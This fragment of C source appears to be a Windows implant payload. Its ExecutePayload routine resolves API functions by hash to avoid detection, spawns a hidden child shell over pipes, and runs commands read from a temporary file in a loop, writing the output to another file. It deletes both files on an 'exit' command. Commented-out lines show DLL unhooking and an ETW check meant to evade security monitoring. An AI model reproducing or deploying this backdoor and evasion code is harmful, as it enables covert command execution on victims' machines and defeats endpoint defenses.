			if (plstrcmpA(tempBuffer, "exit") == 0) {
				WriteToPipe(cmd);
				deleteFile(pathInputFile);
				deleteFile(pathOutputFile);
				pHeapFree(pGetProcessHeap(), 0, cmd);
				return false;
			}
		}

        WriteToPipe(cmd);
        pSleep(2000);

        char* output = ReadFromPipe();
        writeFile(pathOutputFile, output);
		
		pHeapFree(pGetProcessHeap(), 0, output);
        pHeapFree(pGetProcessHeap(), 0, cmd);
    }
    return true;
}


//int main() {
VOID ExecutePayload(VOID) {

    //FuncLoadLibraryA MyLoadLibraryA;

    //MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressWithHash(0x0726774C);

	//MyLoadLibraryA((LPTSTR) sNtdll);
	//MyLoadLibraryA((LPTSTR) sKernel32);
	
	//GETSTDHANDLE_t pGetStdHandle = (GETSTDHANDLE_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sGetStdHandle);
	GETSTDHANDLE_t pGetStdHandle = (GETSTDHANDLE_t) GetProcAddressWithHash( 0x53CABB18 );

	//WRITECONSOLEA_t pWriteConsoleA = (WRITECONSOLEA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteConsoleA);
	WRITECONSOLEA_t pWriteConsoleA = (WRITECONSOLEA_t) GetProcAddressWithHash( 0x5DCB5D71 );
	
	//Sleep_t pSleep = (Sleep_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sSleep);
	Sleep_t pSleep = (Sleep_t) GetProcAddressWithHash( 0xE035F044 );

	g_hChildStd_IN_Rd = NULL;
	g_hChildStd_IN_Wr = NULL;
	g_hChildStd_OUT_Rd = NULL;
	g_hChildStd_OUT_Wr = NULL;


    //unsigned char sKernel32PATH[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\', 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
    //unsigned char sNtdllPATH[] = { 'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };

#pragma warning(push)
#pragma warning(disable : 4055) // Ignore cast warnings

	//MapandUnhook((LPCSTR)sNtdllPATH,(LPCSTR) sNtdll);
	//MapandUnhook((LPCSTR)sKernel32PATH,(LPCSTR) sKernel32);

	//CheckETW();

    initializeTempFilePaths();

    CreatePipes();

    CreateChildProcess();


    while (true) {
        if (!readCommandFileAndExecute(g_pathInputFile, g_pathOutputFile)) break;
		pSleep(6000);
    }


#pragma warning(pop)

    return;
}